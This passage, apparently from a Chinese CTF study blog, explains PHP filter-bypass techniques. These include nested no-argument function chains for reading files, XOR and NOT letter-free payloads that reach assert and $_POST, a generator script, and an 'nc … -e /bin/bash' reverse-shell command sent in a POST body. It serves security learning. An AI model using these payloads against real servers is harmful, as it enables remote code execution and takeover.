class="line">[![img](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104132646463-1482794222.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104132646463-1482794222.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">总共末尾会出现四种情况</span><br><span class="line"></span><br><span class="line">#### **chr(ord(strrev()))**</span><br><span class="line"></span><br><span class="line">再通过反转字符，将.反转到第一位，可以通过ord取到第一位，再通过chr转化为.</span><br><span class="line"></span><br><span class="line">[![img](https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250528205648043.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104133053507-1426321211.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> ord会取字符串中的第一位转化为ascii码</span><br><span class="line"></span><br><span class="line">### 第三层</span><br><span class="line"></span><br><span class="line">其实这里我做了不必要的date()函数吃掉bool放进array中。通过实践发现</span><br><span class="line"></span><br><span class="line">根本无需在crypt中加入serizlize(array())，直接crypt吃掉chdir即可，只需要crypt里面的是一个字符串，返回的bool值也是字符串</span><br><span class="line"></span><br><span class="line">[![img](https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250528205648055.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104133709454-888480156.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">缩短后的payload:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
echo(serialize(file(end(scandir(chr(ord(strrev(crypt(chdir(next(scandir(chr(ord(strrev(crypt(serialize(array())))))))))))))))));
</code></pre>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[![img](https://cdn.jsdelivr.net/gh/csd0617/piclist@main/img/20250528205648049.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104135205216-349338453.png)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">本地测试完全可以获取，请求需要多试很多次，有1/16的纪律会获得，尝试几次就出来了。</span><br><span class="line"></span><br><span class="line">## 获得.的骚姿势</span><br><span class="line"></span><br><span class="line">截取自大佬总结的博客</span><br><span class="line"></span><br><span class="line">### Math函数</span><br><span class="line"></span><br><span class="line">我更愿意归结于math函数而不是phpversion，即便你知道phpversion函数，通过复杂的运算，你还是需要fuzz</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">核心思路是 : phpversion() 函数会返回当前PHP的版本好 , 然后可以用 floor() 函数取第一位的数值( 固定为 7 )</span><br><span class="line"></span><br><span class="line">&gt; </span><br><span class="line"></span><br><span class="line">&gt; highlighter-  SQL</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>floor() : 返回不大于 x 的下一个整数 , 简单的说就是向下取整</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">有了数字 &quot; 7 &quot; , 就可以通过各种数学运算拿到数字46 , 也就是ASCII字符 &quot; . &quot; .</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlighter-  SQL</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<pre><code> sqrt() : 返回一个数字的平方根

 tan() : 返回一个数字的正切

 cosh() : 返回一个数字的双曲余弦

 sinh() : 返回一个数字的双曲正弦

 ceil() : 返回不小于一个数字的下一个整数 , 也就是向上取整
</code></pre>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">经过上面这些步骤 , 能拿到数字 46</span><br><span class="line"></span><br><span class="line">[![img](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104135836747-2035174932.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104135836747-2035174932.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">再通过 `chr()` 函数就可以返回 ASCII 编码为 46 的字符 , 也就为 &quot; . &quot; , 后面的步骤就和之前一样 , 跳转到根目录 , 然后读取 index.php 文件</span><br><span class="line"></span><br><span class="line">### localeconv() 函数</span><br><span class="line"></span><br><span class="line">同boring_code</span><br><span class="line"></span><br><span class="line">### crypt()函数</span><br><span class="line"></span><br><span class="line">首先定义一个数组 , 然后对其进行序列化操作 , 输出序列化字符串 , 这里没什么问题 . 然后就用到一个非常关键的函数 : **`crypt()`**</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlighter-  Bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>crypt($str , [$salt]) : 返回一个基于标准 UNIX DES 算法或系统上其他可用的替代算法的散列字符串 . </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">说起来很复杂 , 你仅需要知道它可以返回一个加密字符串</span><br><span class="line"></span><br><span class="line">[![img](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104140011194-1991312687.png)](https://img2018.cnblogs.com/i-beta/1357258/201911/1357258-20191104140011194-1991312687.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">多次尝试后 , 发现 &quot; . &quot; 会出现在加密字符串的末尾( 加密字符串的开头默认为 : &quot; $ &quot; ) , 然后我才想到 , `scandir(getcwd())` 不能用 , 但可以用 `scandir(&#x27;.&#x27;)` 啊 , 真的太菜了!</span><br><span class="line"></span><br><span class="line">再chr(ord(strrev()))转化为.</span><br><span class="line"></span><br><span class="line">最近又看到一个payload:</span><br><span class="line"></span><br><span class="line">Python</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>readfile(end(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion()))))))))))))));</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">hebrevc() 函数把希伯来文本从右至左的流转换为左至右的流，其实也是crypt的特性，只是都是反转而已.</span><br><span class="line"></span><br><span class="line">以上获取.的两个骚姿势截取自于下面的大佬博客对于此题的总结。</span><br><span class="line"></span><br><span class="line">上海赛的第二题是6月安恒杯的一道web原题。</span><br><span class="line"></span><br><span class="line">官方解是：url双重编码绕过,通过ssrf结合gopher完成SMTP污染从而包含日志进行RCE</span><br><span class="line"></span><br><span class="line">大佬的解：不同的是将邮件正常发给www-data的话正好web可读，通过包含www-data的邮件完成包含一句话进行RCE</span><br><span class="line"></span><br><span class="line">## 0x20无字母数字异或运算绕过</span><br><span class="line"></span><br><span class="line">异或运算poc</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">$shell = $_GET[&quot;cmd&quot;];</span><br><span class="line">$result1 = &quot;&quot;;</span><br><span class="line">$result2 = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">function judge($c)</span><br><span class="line">&#123;</span><br><span class="line">    if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$c))</span><br><span class="line">    &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for($num=0;$num&lt;=strlen($shell);$num++)</span><br><span class="line">&#123;</span><br><span class="line">    for($x=33;$x&lt;=126;$x++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(judge(chr($x)))</span><br><span class="line">        &#123;</span><br><span class="line">            for($y=33;$y&lt;=126;$y++)</span><br><span class="line">            &#123;</span><br><span class="line">                if(judge(chr($y)))</span><br><span class="line">                &#123;</span><br><span class="line">                    $f = chr($x)^chr($y);</span><br><span class="line">                    if($f == $shell[$num])</span><br><span class="line">                    &#123;</span><br><span class="line">                        $result1 .= chr($x);</span><br><span class="line">                        $result2 .= chr($y);</span><br><span class="line">                        break 2;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;异或运算第一部分： &quot;.$result1;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;异或运算第二部分： &quot;.$result2; </span><br></pre></td></tr></table></figure>

<h3 id="PHP5"><a href="#PHP5" class="headerlink" title="PHP5"></a>PHP5</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asset  异或结果   &quot;!((%)(&quot;^&quot;@[[@[\&quot;   需要加个转义字符   &quot;!((%)(&quot;^&quot;@[[@[\\&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_POST  异或结果   &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=&quot;!((%)(&quot;^&quot;@[[@[\\&quot;;$__=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$___=$$__;$_($___[&#x27;_&#x27;]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%20%22!((%25)(%22%5E%22%40%5B%5B%40%5B%5C%5C%22%3B%24__%3D%22!%2B%2F((%22%5E%22~%7B%60%7B%7C%22%3B%24___%3D%24%24__%3B%24_(%24___%5B&#x27;_&#x27;%5D)%3B</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427205028463.png" alt="image-20250427205028463"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%22%2B(%2B).%26%2F%22%5E%22%5B%40%5B%40%40%40%40%22%3B%24_()%3B</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=&quot;+(+).&amp;/&quot;^&quot;[@[@@@@&quot;;$_();</span><br></pre></td></tr></table></figure>

<p>phpinfo();</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427205615557.png" alt="image-20250427205615557"></p>
<h3 id="PHP7"><a href="#PHP7" class="headerlink" title="PHP7"></a>PHP7</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$_POST[_]`;     </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_POST   -&gt;   &quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=$_=&quot;!+/((&quot;^&quot;~&#123;`&#123;|&quot;;$__=$$_;`$__[_]`;</span><br></pre></td></tr></table></figure>

<p>urlencode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=%24_%3D%22!%2B%2F((%22%5E%22~%7B%60%7B%7C%22%3B%24__%3D%24%24_%3B%60%24__%5B_%5D%60%3B</span><br></pre></td></tr></table></figure>

<p>post提交  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_=nc 服务器ip 端口号 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>进行反弹shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../picture/image-20250427210326979.png" alt="image-20250427210326979"></p>
<h2 id="0x21无字母数字取反绕过"><a href="#0x21无字母数字取反绕过" class="headerlink" title="0x21无字母数字取反绕过"></a>0x21无字母数字取反绕过</h2><p>poc</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$result</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> =<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$word</span> = <span class="string">&quot;一乙二十丁厂七卜人入八九几儿了力乃刀又三于干亏士工土才寸下大丈与万上小口巾山千乞川亿个勺久凡及夕丸么广亡门义之尸弓己已子卫也女飞刃习叉马乡丰王井开夫天无元专云扎艺</span></span><br><span class="line"><span class="string">木五支厅不太犬区历尤友匹车巨牙屯比互切瓦止少日中冈贝内水见午牛手毛气升长仁什片仆化仇币仍仅斤爪反介父从今凶分乏公仓月氏勿欠风丹匀乌凤勾文六方火为斗忆订计户认心尺引</span></span><br><span class="line"><span class="string">丑巴孔队办以允予劝双书幻玉刊示末未击打巧正扑扒功扔去甘世古节本术可丙左厉右石布龙平灭轧东卡北占业旧帅归且旦目叶甲申叮电号田由史只央兄叼叫另叨叹四生失禾丘付仗代仙们</span></span><br><span class="line"><span class="string">仪白仔他斥瓜乎丛令用甩印乐句匆册犯外处冬鸟务包饥主市立闪兰半汁汇头汉宁穴它讨写让礼训必议讯记永司尼民出辽奶奴加召皮边发孕圣对台矛纠母幼丝式刑动扛寺吉扣考托老执巩圾</span></span><br><span class="line"><span class="string">扩扫地扬场耳共芒亚芝朽朴机权过臣再协西压厌在有百存而页匠夸夺灰达列死成夹轨邪划迈毕至此贞师尘尖劣光当早吐吓虫曲团同吊吃因吸吗屿帆岁回岂刚则肉网年朱先丢舌竹迁乔伟传</span></span><br><span class="line"><span class="string">乒乓休伍伏优伐延件任伤价份华仰仿伙伪自血向似后行舟全会杀合兆企众爷伞创肌朵杂危旬旨负各名多争色壮冲冰庄庆亦刘齐交次衣产决充妄闭问闯羊并关米灯州汗污江池汤忙兴宇守宅</span></span><br><span class="line"><span class="string">字安讲军许论农讽设访寻那迅尽导异孙阵阳收阶阴防奸如妇好她妈戏羽观欢买红纤级约纪驰巡寿弄麦形进戒吞远违运扶抚坛技坏扰拒找批扯址走抄坝贡攻赤折抓扮抢孝均抛投坟抗坑坊抖</span></span><br><span class="line"><span class="string">护壳志扭块声把报却劫芽花芹芬苍芳严芦劳克苏杆杠杜材村杏极李杨求更束豆两丽医辰励否还歼来连步坚旱盯呈时吴助县里呆园旷围呀吨足邮男困吵串员听吩吹呜吧吼别岗帐财针钉告我</span></span><br><span class="line"><span class="string">乱利秃秀私每兵估体何但伸作伯伶佣低你住位伴身皂佛近彻役返余希坐谷妥含邻岔肝肚肠龟免狂犹角删条卵岛迎饭饮系言冻状亩况床库疗应冷这序辛弃冶忘闲间闷判灶灿弟汪沙汽沃泛沟</span></span><br><span class="line"><span class="string">没沈沉怀忧快完宋宏牢究穷灾良证启评补初社识诉诊词译君灵即层尿尾迟局改张忌际陆阿陈阻附妙妖妨努忍劲鸡驱纯纱纳纲驳纵纷纸纹纺驴纽奉玩环武青责现表规抹拢拔拣担坦押抽拐拖</span></span><br><span class="line"><span class="string">拍者顶拆拥抵拘势抱垃拉拦拌幸招坡披拨择抬其取苦若茂苹苗英范直茄茎茅林枝杯柜析板松枪构杰述枕丧或画卧事刺枣雨卖矿码厕奔奇奋态欧垄妻轰顷转斩轮软到非叔肯齿些虎虏肾贤尚</span></span><br><span class="line"><span class="string">旺具果味昆国昌畅明易昂典固忠咐呼鸣咏呢岸岩帖罗帜岭凯败贩购图钓制知垂牧物乖刮秆和季委佳侍供使例版侄侦侧凭侨佩货依的迫质欣征往爬彼径所舍金命斧爸采受乳贪念贫肤肺肢肿</span></span><br><span class="line"><span class="string">胀朋股肥服胁周昏鱼兔狐忽狗备饰饱饲变京享店夜庙府底剂郊废净盲放刻育闸闹郑券卷单炒炊炕炎炉沫浅法泄河沾泪油泊沿泡注泻泳泥沸波泼泽治怖性怕怜怪学宝宗定宜审宙官空帘实试</span></span><br><span class="line"><span class="string">郎诗肩房诚衬衫视话诞询该详建肃录隶居届刷屈弦承孟孤陕降限妹姑姐姓始驾参艰线练组细驶织终驻驼绍经贯奏春帮珍玻毒型挂封持项垮挎城挠政赴赵挡挺括拴拾挑指垫挣挤拼挖按挥挪</span></span><br><span class="line"><span class="string">某甚革荐巷带草茧茶荒茫荡荣故胡南药标枯柄栋相查柏柳柱柿栏树要咸威歪研砖厘厚砌砍面耐耍牵残殃轻鸦皆背战点临览竖省削尝是盼眨哄显哑冒映星昨畏趴胃贵界虹虾蚁思蚂虽品咽骂</span></span><br><span class="line"><span class="string">哗咱响哈咬咳哪炭峡罚贱贴骨钞钟钢钥钩卸缸拜看矩怎牲选适秒香种秋科重复竿段便俩贷顺修保促侮俭俗俘信皇泉鬼侵追俊盾待律很须叙剑逃食盆胆胜胞胖脉勉狭狮独狡狱狠贸怨急饶蚀</span></span><br><span class="line"><span class="string">饺饼弯将奖哀亭亮度迹庭疮疯疫疤姿亲音帝施闻阀阁差养美姜叛送类迷前首逆总炼炸炮烂剃洁洪洒浇浊洞测洗活派洽染济洋洲浑浓津恒恢恰恼恨举觉宣室宫宪突穿窃客冠语扁袄祖神祝误</span></span><br><span class="line"><span class="string">诱说诵垦退既屋昼费陡眉孩除险院娃姥姨姻娇怒架贺盈勇怠柔垒绑绒结绕骄绘给络骆绝绞统耕耗艳泰珠班素蚕顽盏匪捞栽捕振载赶起盐捎捏埋捉捆捐损都哲逝捡换挽热恐壶挨耻耽恭莲莫</span></span><br><span class="line"><span class="string">荷获晋恶真框桂档桐株桥桃格校核样根索哥速逗栗配翅辱唇夏础破原套逐烈殊顾轿较顿毙致柴桌虑监紧党晒眠晓鸭晃晌晕蚊哨哭恩唤啊唉罢峰圆贼贿钱钳钻铁铃铅缺氧特牺造乘敌秤租积</span></span><br><span class="line"><span class="string">秧秩称秘透笔笑笋债借值倚倾倒倘俱倡候俯倍倦健臭射躬息徒徐舰舱般航途拿爹爱颂翁脆脂胸胳脏胶脑狸狼逢留皱饿恋桨浆衰高席准座脊症病疾疼疲效离唐资凉站剖竞部旁旅畜阅羞瓶拳</span></span><br><span class="line"><span class="string">粉料益兼烤烘烦烧烛烟递涛浙涝酒涉消浩海涂浴浮流润浪浸涨烫涌悟悄悔悦害宽家宵宴宾窄容宰案请朗诸读扇袜袖袍被祥课谁调冤谅谈谊剥恳展剧屑弱陵陶陷陪娱娘通能难预桑绢绣验继</span></span><br><span class="line"><span class="string">球理捧堵描域掩捷排掉堆推掀授教掏掠培接控探据掘职基著勒黄萌萝菌菜萄菊萍菠营械梦梢梅检梳梯桶救副票戚爽聋袭盛雪辅辆虚雀堂常匙晨睁眯眼悬野啦晚啄距跃略蛇累唱患唯崖崭崇</span></span><br><span class="line"><span class="string">圈铜铲银甜梨犁移笨笼笛符第敏做袋悠偿偶偷您售停偏假得衔盘船斜盒鸽悉欲彩领脚脖脸脱象够猜猪猎猫猛馅馆凑减毫麻痒痕廊康庸鹿盗章竟商族旋望率着盖粘粗粒断剪兽清添淋淹渠渐</span></span><br><span class="line"><span class="string">混渔淘液淡深婆梁渗情惜惭悼惧惕惊惨惯寇寄宿窑密谋谎祸谜逮敢屠弹随蛋隆隐婚婶颈绩绪续骑绳维绵绸绿琴斑替款堪搭塔越趁趋超提堤博揭喜插揪搜煮援裁搁搂搅握揉斯期欺联散惹葬</span></span><br><span class="line"><span class="string">葛董葡敬葱落朝辜葵棒棋植森椅椒棵棍棉棚棕惠惑逼厨厦硬确雁殖裂雄暂雅辈悲紫辉敞赏掌晴暑最量喷晶喇遇喊景践跌跑遗蛙蛛蜓喝喂喘喉幅帽赌赔黑铸铺链销锁锄锅锈锋锐短智毯鹅剩</span></span><br><span class="line"><span class="string">稍程稀税筐等筑策筛筒答筋筝傲傅牌堡集焦傍储奥街惩御循艇舒番释禽腊脾腔鲁猾猴然馋装蛮就痛童阔善羡普粪尊道曾焰港湖渣湿温渴滑湾渡游滋溉愤慌惰愧愉慨割寒富窜窝窗遍裕裤裙</span></span><br><span class="line"><span class="string">谢谣谦属屡强粥疏隔隙絮嫂登缎缓编骗缘瑞魂肆摄摸填搏塌鼓摆携搬摇搞塘摊蒜勤鹊蓝墓幕蓬蓄蒙蒸献禁楚想槐榆楼概赖酬感碍碑碎碰碗碌雷零雾雹输督龄鉴睛睡睬鄙愚暖盟歇暗照跨跳</span></span><br><span class="line"><span class="string">跪路跟遣蛾蜂嗓置罪罩错锡锣锤锦键锯矮辞稠愁筹签简毁舅鼠催傻像躲微愈遥腰腥腹腾腿触解酱痰廉新韵意粮数煎塑慈煤煌满漠源滤滥滔溪溜滚滨粱滩慎誉塞谨福群殿辟障嫌嫁叠缝缠静</span></span><br><span class="line"><span class="string">碧璃墙撇嘉摧截誓境摘摔聚蔽慕暮蔑模榴榜榨歌遭酷酿酸磁愿需弊裳颗嗽蜻蜡蝇蜘赚锹锻舞稳算箩管僚鼻魄貌膜膊膀鲜疑馒裹敲豪膏遮腐瘦辣竭端旗精歉熄熔漆漂漫滴演漏慢寨赛察蜜谱</span></span><br><span class="line"><span class="string">嫩翠熊凳骡缩慧撕撒趣趟撑播撞撤增聪鞋蕉蔬横槽樱橡飘醋醉震霉瞒题暴瞎影踢踏踩踪蝶蝴嘱墨镇靠稻黎稿稼箱箭篇僵躺僻德艘膝膛熟摩颜毅糊遵潜潮懂额慰劈操燕薯薪薄颠橘整融醒餐</span></span><br><span class="line"><span class="string">嘴蹄器赠默镜赞篮邀衡膨雕磨凝辨辩糖糕燃澡激懒壁避缴戴擦鞠藏霜霞瞧蹈螺穗繁辫赢糟糠燥臂翼骤鞭覆蹦镰翻鹰警攀蹲颤瓣爆疆壤耀躁嚼嚷籍魔灌蠢霸露囊罐匕刁丐歹戈夭仑讥冗邓艾</span></span><br><span class="line"><span class="string">夯凸卢叭叽皿凹囚矢乍尔冯玄邦迂邢芋芍吏夷吁吕吆屹廷迄臼仲伦伊肋旭匈凫妆亥汛讳讶讹讼诀弛阱驮驯纫玖玛韧抠扼汞扳抡坎坞抑拟抒芙芜苇芥芯芭杖杉巫杈甫匣轩卤肖吱吠呕呐吟呛</span></span><br><span class="line"><span class="string">吻吭邑囤吮岖牡佑佃伺囱肛肘甸狈鸠彤灸刨庇吝庐闰兑灼沐沛汰沥沦汹沧沪忱诅诈罕屁坠妓姊妒纬玫卦坷坯拓坪坤拄拧拂拙拇拗茉昔苛苫苟苞茁苔枉枢枚枫杭郁矾奈奄殴歧卓昙哎咕呵咙</span></span><br><span class="line"><span class="string">呻啰咒咆咖帕账贬贮氛秉岳侠侥侣侈卑刽刹肴觅忿瓮肮肪狞庞疟疙疚卒氓炬沽沮泣泞泌沼怔怯宠宛衩祈诡帚屉弧弥陋陌函姆虱叁绅驹绊绎契贰玷玲珊拭拷拱挟垢垛拯荆茸茬荚茵茴荞荠荤</span></span><br><span class="line"><span class="string">荧荔栈柑栅柠枷勃柬砂泵砚鸥轴韭虐昧盹咧昵昭盅勋哆咪哟幽钙钝钠钦钧钮毡氢秕俏俄俐侯徊衍胚胧胎狰饵峦奕咨飒闺闽籽娄烁炫洼柒涎洛恃恍恬恤宦诫诬祠诲屏屎逊陨姚娜蚤骇耘耙秦</span></span><br><span class="line"><span class="string">匿埂捂捍袁捌挫挚捣捅埃耿聂荸莽莱莉莹莺梆栖桦栓桅桩贾酌砸砰砾殉逞哮唠哺剔蚌蚜畔蚣蚪蚓哩圃鸯唁哼唆峭唧峻赂赃钾铆氨秫笆俺赁倔殷耸舀豺豹颁胯胰脐脓逛卿鸵鸳馁凌凄衷郭斋</span></span><br><span class="line"><span 